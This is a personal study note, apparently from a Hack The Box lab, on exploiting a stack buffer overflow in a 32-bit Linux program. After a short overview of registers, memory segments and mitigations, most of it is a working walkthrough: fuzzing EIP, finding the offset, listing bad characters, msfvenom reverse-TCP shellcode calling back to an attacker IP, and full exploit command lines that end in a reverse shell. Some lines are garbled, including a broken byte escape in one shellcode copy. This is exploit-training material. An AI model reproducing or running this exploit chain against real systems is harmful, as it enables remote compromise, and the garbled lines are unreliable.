For code to be executed in CPU it need to first reverse a stuck or buffer in the memory.
The idea behind Buffer overflow is inserting more data input a input field then the program expected, there by overflowing the buffer that have been created and write to other registers. The goal here for a hacker is to overwrite the return address with code to execute commands as the program.

## Instruction cycle

Each CPU architecture have a different instruction cycle but can be summerized like this.

| Instruction                | Description                                                                                                                                                    |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| FETCH                      | Machine instruction address is read from the Instruction address register (IAR)) It is then loaded from  [[RAM]] or cache into the instruction register (IR)   |
| DECODE                     | The instruction is decoded and start circuits to execute the instructions.                                                                                     |
| FETCH operands             | If more data have to be loaded for the command to execute it done now in the cache or ram working registers.                                                   |
| EXECUTE                    | The instruction is executed, the status register is set, which can be evaluated by subsequent instruction                                                      |
| UPDATE INSTRUCTION POINTER | if no jump instruction have was executed in the execute phase, the IAR is now increased by the length of the instruction so it point to the next machine code. |

## Memory

When a program is executed, the sections is mapped to the process, and this segments are loaded into memory as ELF file.

### Buffer

![Buffer](https://raw.githubusercontent.com/Paradoxxs/Cybersecurity/master/Pasted%20image%2020210607114642.png)

#### .text

Contain the assembly instruction.
Read-only to prevent processes from modifying instuction. writhing to this will result in sgement failure.

#### .data
contains variables contained by the program 

#### .bss
used by some as data segmentation, which is represented as 0-bits 

#### heap
Starts at the end of .bss and grows to higher memory addresses. 

#### stack 
Is a last-in-first-out data structure, where the return addresses, parameters and frame pointer are stored. c/c++ local varibles are stored here, code can even be copied to the stack. The stack is usually placed RAM lower area above the global and static variables. 
To get access to the stack, stack pointer is used. The allocation grows down to the lower memory address. 

## CPU 

### Data registers 

|32-bit register| 64-bit register| Description|
|---|---|---|
|EAX|RAX|Accumlator is used for input/output for airthmetic operations|
|EBX|RBX|indexing addresses|
|ECX|RCX|Counter used to rotate  instruction and counter loops|
|EDX|RDX|Data used for I/O and arithmetic operations for multiply, divide and operations involving large values|



### Pointer registers 
|32-bit |64-big | Description |
|EIP|RIP|Instruction pointer stores the offset address for the next instruction to be executed. 
|ESP|RSP|Stack pointer points to the top of the stack|
|EBP|RBP|Base pointer is also known as stack base pointer or frame pointer that points to the base of the stack|


### Stack frames
The stack starts at a higher memory and goes down as values is increased. The base pointer points to the beginning of the stack. As the stack grown it goes segmented into smaller frames, that get allocated into memory. A stack frame defines a frame of data that begins with *EBP* and end with *ESP*

```shell-session
Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

To leave the stack frame, the opposite is done- 
```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       
   0x0000054e <+1>:	    mov    ebp,esp   
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  # <----------------------
   0x00000581 <+52>:	ret    # <--- Leave stack frame
```

### Index registers 
|32-bit|64-bit|Description|
|---|---|---|
|ESI|RSI|Source index is used pointer from source for string operations|
|EDI|RDI|Destination is used as a pointer to a destination for string operations|


### Bad Characters 
The goal is to inject all possible hex code into the system to see what get overwritten. 

```python
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Inject the code into the process and see if it gets over written with /x00 and remove it from injection. 

bad character found \x00\x09\x0a\x20
Generate shellcode. 
```
msfvenom -p linux/x86/shell\_reverse\_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20"   
Found 11 compatible encoders  
Attempting to encode payload with 1 iterations of x86/shikata\_ga\_nai  
x86/shikata\_ga\_nai succeeded with size 95 (iteration=0)  
x86/shikata\_ga\_nai chosen with final size 95  
Payload size: 95 bytes  
Final size of c file: 425 bytes  
unsigned char buf\[\] =    
"\xb8\x7c\xde\x75\x08\xd9\xc1\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"  
"\x12\x31\x43\x12\x03\x43\x12\x83\xbf\xda\x97\xfd\x0e\x38\xa0"  
"\x1d\x23\xfd\x1c\x88\xc1\x88\x42\xfc\xa3\x47\x04\x6e\x72\xe8"  
"\x3a\x5c\x04\x41\x3c\xa7\x6c\x2d\xbe\x57\x6d\xb9\xbc\x57\x17"  
"\x50\x48\xb6\x57\xc4\x1a\x68\xc4\xba\x98\x03\x0b\x71\x1e\x41"  
"\xa3\xe4\x30\x15\x5b\x91\x61\xf6\xf9\x08\xf7\xeb\xaf\x99\x8e"  
"\x0d\xff\x15\x5c\x4d";

```

```
\xb8\x7c\xde\x75\x08\xd9\xc1\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x43\x12\x03\x43\x12\x83\xbf\xda\x97\xfd\x0e\x38\xa0\x1d\x23\xfd\x1c\x88\xc1\x88\x42\xfc\xa3\x47\x04\x6e\x72\xe8\x3a\x5c\x04\x41\x3c\xa7\x6c\x2d\xbe\x57\x6d\xb9\xbc\x57\x17\x50\x48\xb6\x57\xc4\x1a\x68\c4\xba\x98\x03\x0b\x71\x1e\x41\xa3\xe4\x30\x15\x5b\x91\x61\xf6\xf9\x08\xf7\xeb\xaf\x99\x8e\x0d\xff\x15\x5c\x4d
```


## Prevention 
The best way it being conscious when programming to ensure such vulnabilities does not apear. 

### Canaries 
Are known values to the stack between the buffer and control data, and if the canary get overwritten and the system would check it during run time and is it overwritten it would result in crash. 

### Address space layout randomization 
This techquine is to hide  the relevant address to make it harder for a attack to figure out the target addresses in memory. Leaving us to guess the address location

### Data execution prevention (DEP)
DEP is a security feature in windows XP SP2, program are monitored during execution, and if the program attempts to call or access program code in a unauthorized way it get terminated. 

## Usage 

### Take control of EIP 
The goal is to find the offset of how many bytes is need to overwrite the EIP so we know how much space we have for our shellcode. 

We start by sending code though the program to see how many character we need to overwrite the EIP 

```
(gdb) run $(python -c "print '\x55' * 2100")
Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 3000")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) info registers
eax            0x0      0
ecx            0x15     21
edx            0x56558158       1448444248
ebx            0x55555555       1431655765
esp            0xffffc900       0xffffc900
ebp            0x55555555       0x55555555
esi            0xffffc940       -14016
edi            0x0      0
eip            0x55555555       0x55555555
eflags         0x10286  [ PF SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```
as you can see with 3000 \x55 we where able to overwrite it. 

But we do not now the precise number this is where pattern creation come in. 
We start by creating a pattern by using metasploit framework, this we create a pattern which we can use to determ the space. 

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100 > pattern.txt
```

Lets inject the pattern into the program

```
run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A -snip- Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9'")  

--snip--
  
Program received signal SIGSEGV, Segmentation fault.  
0x37714336 in ?? ()  
(gdb) info registers eip  
eip            0x37714336       0x37714336

```

```
/usr/share/metasploit-framework/tools/exploit/pattern\_offset.rb -q 0x37714336  
\[\*\] Exact match at offset 2060
```

We know we have to send 2060 to reach the EIP. lets validate it. 

```shell-session
run $(python "print '\x55' * 2060 + '\x66'* 4")

--snip-- 

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```
We overwritten the EIP with our \x66. 


```
info proc all
```

Lets determin the size of the shellcode, We need a total for 2064 to reach EIP. 
We insert NOPS to ensure it gets execute clearly. 

100 byes of nops
150 bytes for the shell 
and 4 for EIP 

(2064 -100 - 150 -4)


Before we create out shell code we need to know if there are any bad characters.
we now need to create a break point
```
disas main 
```
find a function and create a break point
```
break leavemsg
```

```
run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```

The bad character *\x00\x09\x0a\x20*

Lets create a shell code to get access without the bad characters. 

```
msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=10.10.14.51 --bad-chars "\x00\x09\x0a\x20" lport=6666 --platform linux --arch x86 --format c   
Found 11 compatible encoders  
Attempting to encode payload with 1 iterations of x86/shikata\_ga\_nai  
x86/shikata\_ga\_nai succeeded with size 95 (iteration=0)  
x86/shikata\_ga\_nai chosen with final size 95  
Payload size: 95 bytes  
Final size of c file: 425 bytes  
unsigned char buf\[\] =    
"\xbe\xb3\x33\xd8\xbf\xdb\xcc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"  
"\x12\x83\xeb\xfc\x31\x73\x0e\x03\xc0\x3d\x3a\x4a\x17\x99\x4d"  
"\x56\x04\x5e\xe1\xf3\xa8\xe9\xe4\xb4\xca\x24\x66\x27\x4b\x07"  
"\x58\x85\xeb\x2e\xde\xec\x83\xba\x2a\x01\x60\xd3\x28\x1d\x9c"  
"\x29\xa4\xfc\x10\x4b\xe6\xaf\x03\x27\x05\xd9\x42\x8a\x8a\x8b"  
"\xec\x7b\xa4\x58\x84\xeb\x95\xb1\x36\x85\x60\x2e\xe4\x06\xfa"  
"\x50\xb8\xa2\x31\x12";
```

payload
```
\xbe\xb3\x33\xd8\xbf\xdb\xcc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x73\x0e\x03\xc0\x3d\x3a\x4a\x17\x99\x4d\x56\x04\x5e\xe1\xf3\xa8\xe9\xe4\xb4\xca\x24\x66\x27\x4b\x07\x58\x85\xeb\x2e\xde\xec\x83\xba\x2a\x01\x60\xd3\x28\x1d\x9c\x29\xa4\xfc\x10\x4b\xe6\xaf\x03\x27\x05\xd9\x42\x8a\x8a\x8b\xec\x7b\xa4\x58\x84\xeb\x95\xb1\x36\x85\x60\x2e\xe4\x06\xfa\x50\xb8\xa2\x31\x12
```

We have to adjust our payload again 

```
run $(python -c 'print "\x55" * (2064 - 124 - 95 - 4) + "\x90" * 124 + "\xbe\xb3\x33\xd8\xbf\xdb\xcc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x73\x0e\x03\xc0\x3d\x3a\x4a\x17\x99\x4d\x56\x04\x5e\xe1\xf3\xa8\xe9\xe4\xb4\xca\x24\x66\x27\x4b\x07\x58\x85\xeb\x2e\xde\xec\x83\xba\x2a\x01\x60\xd3\x28\x1d\x9c\x29\xa4\xfc\x10\x4b\xe6\xaf\x03\x27\x05\xd9\x42\x8a\x8a\x8b\xec\x7b\xa4\x58\x84\xeb\x95\xb1\x36\x85\x60\x2e\xe4\x06\xfa\x50\xb8\xa2\x31\x12" + "\x66" + 4')
```

```shell-session
run $(python -c 'print "\x55" * (2064 - 124 - 95 - 4) + "\x90" * 124 + "\xbe\xb3\x33\xd8\xbf\xdb\xcc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x73\x0e\x03\xc0\x3d\x3a\x4a\x17\x99\x4d\x56\x04\x5e\xe1\xf3\xa8\xe9\xe4\xb4\xca\x24\x66\x27\x4b\x07\x58\x85\xeb\x2e\xde\xec\x83\xba\x2a\x01\x60\xd3\x28\x1d\x9c\x29\xa4\xfc\x10\x4b\xe6\xaf\x03\x27\x05\xd9\x42\x8a\x8a\x8b\xec\x7b\xa4\x58\x84\xeb\x95\xb1\x36\x85\x60\x2e\xe4\x06\xfa\x50\xb8\xa2\x31\x12" + "\x66" * 4')
```


We know need to identify the address our EIP need to point toward.  

```shell-session
(gdb) x/2000xb $esp+1400

<SNIP>
0xffffd614:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55  
0xffffd61c:     0x55    0x90    0x90    0x90    0x90    0x90    0x90    0x90 
					# ---> start of nops 
0xffffd624:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd62c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd634:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd63c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd644:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd64c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd654:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd65c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd664:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd66c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd674:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd67c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd684:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd68c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90  
0xffffd694:     0x90    0x90    0x90    0x90    0x90    0xbe    0xb3    0x33  
						 # |---> Shellcode
<SNIP>
```

Lets pick a adress  for our EIP. 
0xffffd684
```shell-session
run $(python -c 'print "\x55" * (2064 - 124 - 95 - 4) + "\x90" * 124 + "\xbe\xb3\x33\xd8\xbf\xdb\xcc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x73\x0e\x03\xc0\x3d\x3a\x4a\x17\x99\x4d\x56\x04\x5e\xe1\xf3\xa8\xe9\xe4\xb4\xca\x24\x66\x27\x4b\x07\x58\x85\xeb\x2e\xde\xec\x83\xba\x2a\x01\x60\xd3\x28\x1d\x9c\x29\xa4\xfc\x10\x4b\xe6\xaf\x03\x27\x05\xd9\x42\x8a\x8a\x8b\xec\x7b\xa4\x58\x84\xeb\x95\xb1\x36\x85\x60\x2e\xe4\x06\xfa\x50\xb8\xa2\x31\x12" + "\x84\xd6\xff\xff"')
```

We got reverse shell. now I need access as root. 
